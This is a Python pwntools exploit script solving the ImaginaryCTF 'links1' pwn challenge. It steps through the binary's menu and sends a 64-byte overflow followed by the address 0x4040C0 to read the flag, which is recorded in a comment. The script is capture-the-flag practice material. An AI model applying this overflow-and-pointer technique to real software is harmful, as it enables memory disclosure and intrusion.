from pwn import *

elf = context.binary = ELF('links1')
p = elf.process()
rop = ROP(elf)

#p = remote('puzzler7.imaginaryctf.org',2004)

p.sendlineafter('>>>','2')
p.sendlineafter('>>>','0')
p.sendlineafter('>>>','jo')
p.sendlineafter('>>>','2')
p.sendlineafter('>>>','1')
p.sendlineafter('>>>','pugal')
p.sendlineafter('>>>','2')
p.sendlineafter('>>>','0')

payload = b'A'*64
payload += p64(0x4040C0)

p.sendlineafter('>>>',payload)
log.warning('choose option 1 and exit immediately')
p.recvuntil('>>>')
p.interactive()

# ictf{arbitrary_read_ftw_d52a23c3}

# flag stored at: 0x4040C0
